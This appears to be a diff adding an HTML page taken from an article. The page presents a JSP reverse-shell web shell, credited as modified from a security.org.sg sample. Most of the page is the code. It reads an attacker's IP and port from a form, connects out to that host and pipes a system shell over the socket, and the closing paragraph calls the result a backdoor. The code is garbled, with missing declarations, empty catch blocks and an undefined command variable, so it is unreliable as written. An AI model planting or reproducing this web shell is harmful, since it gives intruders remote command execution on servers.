@@ -1,0 +1,60 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Reverse</title>
+</head><body>Reverse shells allow us to telnet to the box and execute commands on behalf of the user running the script (typically 'www' or 'nobody'). I grabbed this from http://www.security.org.sg/code/jspreverse.html and modified it slightly to fit in the article without taking up too much space and to work on both Linux and Windows boxes. Lets have a look see:<br/>
+&lt;html&gt;<br/>
+&lt;%@ page import="java.lang.*, java.util.*, java.io.*, java.net.*" % &gt;<br/>
+&lt;%! static class StreamConnector extends Thread{<br/>
+InputStream is;<br/>
+OutputStream os;<br/>
+StreamConnector(InputStream is, OutputStream os){<br/>
+while( (lenRead = isr.read(buffer, 0, buffer.length)) &gt; 0){<br/>
+osw.write(buffer, 0, lenRead);<br/>
+osw.flush();<br/>
+}<br/>
+}<br/>
+catch (Exception ioe)<br/>
+try{<br/>
+if(isr != null) isr.close();<br/>
+if(osw != null) osw.close();<br/>
+}<br/>
+catch (Exception ioe)<br/>
+}<br/>
+}<br/>
+%&gt;<br/>
+&lt;form method="post"&gt;<br/>
+IP Address&lt;input type="text" name="ipaddress" size=30&gt;<br/>
+Port&lt;input type="text" name="port" size=10&gt;<br/>
+&lt;input type="submit" name="Connect" value="Connect"&gt;<br/>
+&lt;/form&gt; &lt;pre&gt;<br/>
+&lt;% String ipAddress = request.getParameter("ipaddress");<br/>
+String OS = System.GetProperty("os.name");<br/>
+String ipPort = request.getParameter("port");<br/>
+if(ipAddress != null &amp;&amp; ipPort != null){ <br/>
+Socket sock = null;<br/>
+try{<br/>
+sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());<br/>
+if(OS.startsWith("Windows")) // if windows use cmd /c, if not, just pass the command<br/>
+{<br/>
+Process proc = Runtime.getRuntime().exec("cmd.exe /C " + cmd);<br/>
+}<br/>
+else<br/>
+{<br/>
+Process proc = Runtime.getRuntime().exec(cmd);<br/>
+}<br/>
+StreamConnector outputConnector = new StreamConnector(proc.getInputStream(),<br/>
+sock.getOutputStream());<br/>
+StreamConnector inputConnector = new StreamConnector(sock.getInputStream(),<br/>
+proc.getOutputStream());<br/>
+outputConnector.start();<br/>
+inputConnector.start();<br/>
+}<br/>
+catch(Exception e)<br/>
+}%&gt; &lt;/pre&gt;<br/>
+&lt;!-- Code from http://www.security.org.sg/code/jspreverse.html modified for linux and windows<br/>
+by Joseph Giron --&gt;<br/>
+&lt;/html&gt; <br/>
+<br/>
+And now for usual explanation of the code. The code starts off by importing classes, declaring variables, and defining stream objects for input and output. The streams are initialized and an output buffer is defined. Then we have your run of the mill html form code that grabs the IP address and port number to connect to. Next the code grabs the passed variables and initializes socket code, checks to see which OS is running, then passes handle of Runtime.exec to the socket for reading and writing. In layman's, it shows us a form to enter an IP and a port for us to enter our info then creates a backdoor for us. Isn't java fun? </body></html>
